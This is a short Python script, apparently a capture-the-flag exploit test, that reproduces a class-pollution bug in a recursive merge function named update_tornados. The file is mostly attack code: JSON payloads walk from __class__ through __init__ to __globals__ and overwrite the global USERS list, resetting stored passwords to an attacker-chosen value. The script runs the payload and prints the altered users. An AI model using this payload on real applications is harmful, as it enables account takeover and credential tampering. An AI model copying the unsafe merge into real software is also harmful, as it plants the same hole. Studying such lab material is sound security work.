import random, json
def update_tornados(tornado, updated):
    for index, value in tornado.items():
        
        print('[Debug] index, value:', index, value, flush=True)
        
        if hasattr(updated, "__getitem__"): # USERS[]
            
            if updated.get(index) and type(value) == dict:
                
                print('[Debug] updated.get(index):', updated.get(index),flush=True)
                
                update_tornados(value, updated.get(index))
            else:
                
                print('[Debug] updated[index], value', updated[index], value,flush=True)
                
                updated[index] = value                          # USERS[0]["password"] = "bbt"
        elif hasattr(updated, index) and type(value) == dict:
            
            print('[Debug] hasattr:', updated, index, value,flush=True)
            
            update_tornados(value, getattr(updated, index))
        else:
            
            print('[Debug] setattr:', updated, index, value, flush=True)
            
            setattr(updated, index, value)  # updated.index = value
            
class TornadoObject:
	def __init__(self, machine_id, ip_address, status):
		self.machine_id = machine_id
		self.ip_address = ip_address
		self.status = status

	def serialize(self):
		return vars(self)	# return dict of machine_id, ip_address, status

def random_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

def random_hostname():
    return f"host-{random.randint(1000, 9999)}"

def random_status():
    return random.choice(["active", "inactive"])
USERS = [	
	{
		"username": "lean@tornado-service.htb",
		"password": "hidden",
	},
	{
		"username": "xclow3n@tornado-service.htb",
		"password": "hidden",
	},
	{
		"username": "makelaris@tornado-service.htb",
		"password": "hidden"
	}
]
tornado = TornadoObject(machine_id=random_hostname(), ip_address=random_ip(), status=random_status())

data = """{
    "machine_id":"ấdf",
    "__class__":{
        "__init__":{
            "__globals__":{
                "USERS":[{
                    "username":"bbt@bbt.com",
                    "password":"bbt"
                }]
            }
        }
    }
}"""

data1 = """{
    "machine_id":"ấdf",
    "__class__":{
        "__init__":{
            "__globals__":{
                "USERS":{
                    "0": {
                        "password":"bbt"
                        }
                }
            }
        }
    }
}"""

data = json.loads(data)

update_tornados(data, tornado)

print('\n\n\n\n',USERS)